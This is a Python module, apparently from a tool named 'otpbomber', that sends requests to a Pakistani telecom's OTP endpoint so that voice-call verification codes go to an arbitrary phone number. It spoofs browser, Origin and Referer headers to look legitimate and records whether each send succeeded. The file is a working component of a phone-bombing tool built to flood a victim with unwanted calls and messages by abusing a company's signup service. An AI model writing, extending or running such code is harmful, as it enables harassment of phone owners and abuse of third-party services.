from otpbomber.core import *
from otpbomber.localuseragent import *
import asyncio

async def jazz_voice(phone, client, out):
    name = 'jazz_voice'
    domain = 'jazz.com.pk'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json', 'Origin': 'https://jazz.com.pk', 'Referer': 'https://jazz.com.pk/'}
    json_data = {'msisdn': f'0{phone[-10:]}', 'method': 'voice', 'type': 'signup'}
    try:
        response = await client.post('https://api.jazz.com.pk/customer/v1/otp/send', headers=headers, json=json_data)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})